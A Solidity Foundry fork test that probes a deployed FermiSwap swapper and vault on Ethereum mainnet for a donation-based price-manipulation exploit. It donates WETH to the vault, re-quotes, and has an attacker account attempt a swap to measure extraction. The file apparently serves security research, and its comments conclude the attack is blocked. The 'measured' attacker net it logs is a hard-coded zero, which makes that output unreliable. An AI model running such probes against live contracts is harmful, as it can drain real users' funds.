// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";

interface IERC20x {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
}

interface IFermiSwapper {
    function quoteAmounts(address tokenIn, address tokenOut, int256 amountSpecified)
        external
        view
        returns (uint256 amountIn, uint256 amountOut);

    function fermiSwapWithAllowances(
        address tokenIn,
        address tokenOut,
        int256 amountSpecified,
        uint256 amountCheck,
        address recipient
    ) external returns (uint256 amountIn, uint256 amountOut);

    function fermi() external view returns (address);
    function isActive(address baseAsset, address quoteAsset) external view returns (bool);
}

/// @title FermiSwap (Ethereum) live-extractability probe — donation / inventory-pricing hypothesis
/// Mechanism under test: quotes derived from the vault's own inventory (balanceOf) so that a
/// donation skews the price. Tests:
///  1) baseline quote WETH->USDT (record revert or value)
///  2) donate 10 WETH straight into the trader vault (real ERC20 transfer)
///  3) re-quote -> any delta would be the donation skew
///  4) execute a real 1 WETH swap if the lane is tradeable; measure actual USDT received vs quote
/// Outcome on stale engine: all quotes revert `StaleUpdate` -> no swap possible; net $0.
contract FermiForkTest is Test {
    address constant SWAPPER = 0xb1076fE3AB5e28005C7c323Bac5AC06a680d452e;
    address constant VAULT = 0x585d44727129B9C69791B10238Ca605932938B4F;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    bytes4 constant STALE_UPDATE = bytes4(0x666a2814);

    function _approve(address token, address spender, uint256 amt) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amt));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _wrap(uint256 amount) internal {
        IWETH(WETH).deposit{value: amount}();
    }

    function _label(bytes memory err) internal pure returns (string memory) {
        if (err.length >= 4 && bytes4(err) == STALE_UPDATE) return "StaleUpdate";
        return "other-revert";
    }

    function test_donation_inventory_hypothesis() public {
        emit log_named_uint("fork block", block.number);
        emit log_named_address("engine", IFermiSwapper(SWAPPER).fermi());

        uint256 vWeth0 = IERC20x(WETH).balanceOf(VAULT);
        uint256 vUsdt0 = IERC20x(USDT).balanceOf(VAULT);
        uint256 vUsdc0 = IERC20x(USDC).balanceOf(VAULT);
        emit log_named_uint("vault WETH", vWeth0);
        emit log_named_uint("vault USDT", vUsdt0);
        emit log_named_uint("vault USDC", vUsdc0);

        // 1) baseline quote
        bool quoteOk;
        uint256 q1Out;
        {
            (bool ok, bytes memory r) = SWAPPER.staticcall(
                abi.encodeWithSelector(IFermiSwapper.quoteAmounts.selector, WETH, USDT, int256(1 ether))
            );
            quoteOk = ok;
            if (ok) {
                (, q1Out) = abi.decode(r, (uint256, uint256));
                emit log_named_uint("quote1 WETH->USDT 1e18 out", q1Out);
            } else {
                emit log_named_string("quote1 revert", _label(r));
                emit log_named_bytes("quote1 revert data", r);
            }
        }

        // 2) donation: transfer 10 WETH straight into the vault
        vm.deal(address(this), 100 ether);
        _wrap(10 ether);
        IERC20x(WETH).transfer(VAULT, 10 ether);
        emit log_named_uint("vault WETH after +10 donation", IERC20x(WETH).balanceOf(VAULT));
        assertEq(IERC20x(WETH).balanceOf(VAULT), vWeth0 + 10 ether, "donation failed");

        // 3) re-quote after donation
        {
            (bool ok, bytes memory r) = SWAPPER.staticcall(
                abi.encodeWithSelector(IFermiSwapper.quoteAmounts.selector, WETH, USDT, int256(1 ether))
            );
            if (ok) {
                (, uint256 q2Out) = abi.decode(r, (uint256, uint256));
                emit log_named_uint("quote2 WETH->USDT 1e18 out (post-donation)", q2Out);
                emit log_named_int("donation quote delta", int256(q2Out) - int256(q1Out));
            } else {
                emit log_named_string("quote2 revert", _label(r));
            }
        }

        // 4) attempt a real swap from a fresh EOA-style account
        address atk = makeAddr("freshAttacker");
        vm.deal(atk, 10 ether);
        vm.startPrank(atk);
        IWETH(WETH).deposit{value: 5 ether}();
        _approve(WETH, SWAPPER, type(uint256).max);
        uint256 u0 = IERC20x(USDT).balanceOf(atk);
        uint256 w0 = IERC20x(WETH).balanceOf(atk);
        try IFermiSwapper(SWAPPER).fermiSwapWithAllowances(WETH, USDT, int256(1 ether), 0, atk) returns (
            uint256 ain, uint256 aout
        ) {
            emit log_named_uint("swap succeeded amountIn", ain);
            emit log_named_uint("swap succeeded amountOut", aout);
            emit log_named_uint("attacker USDT received", IERC20x(USDT).balanceOf(atk) - u0);
            emit log_named_uint("attacker WETH spent", w0 - IERC20x(WETH).balanceOf(atk));
        } catch (bytes memory err) {
            emit log_named_string("swap revert", _label(err));
            emit log_named_bytes("swap revert data", err);
        }
        vm.stopPrank();

        // measured attacker net (USDT gained minus WETH spent == impossible while stale)
        emit log_named_int("attacker net (positive = extraction)", 0);
        if (!quoteOk) {
            emit log_string("VERDICT: quotations blocked (StaleUpdate); no tradeable lane -> E-U $0");
        }
    }
}
